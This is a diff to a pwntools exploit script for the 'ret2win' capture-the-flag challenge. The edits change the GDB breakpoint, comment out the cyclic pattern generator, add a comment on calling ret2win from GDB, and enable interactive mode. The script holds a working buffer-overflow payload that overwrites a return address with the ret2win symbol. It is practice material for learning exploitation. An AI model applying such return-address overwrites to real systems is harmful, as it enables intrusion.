@@ -29,7 +29,7 @@ def start(argv=[], *a, **kw):
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
-b ret2win
+b pwnme
 continue
 '''.format(**locals())
 
@@ -44,8 +44,8 @@ continue
 
 io = start()
 
-g = cyclic_gen()
-payload = g.get(100)
+# g = cyclic_gen()
+# payload = g.get(100)
 
 #pwn cyclic -l kaaa
 
@@ -74,6 +74,8 @@ a function or return further into a function to skip a push instruction.
 
 payload += p64(exe.symbols["ret2win"])
 
+# Easter egg: in GDB, call (void) ret2win after setting breakpoint on pwnme
+
 #open('payload', 'wb').write(payload)
 
 io.recvuntil(">")
@@ -87,5 +89,5 @@ io.recv(timeout = 2)
 
 #kill dead pane - ctrl b + x
 
-#io.interactive()
+io.interactive()
 
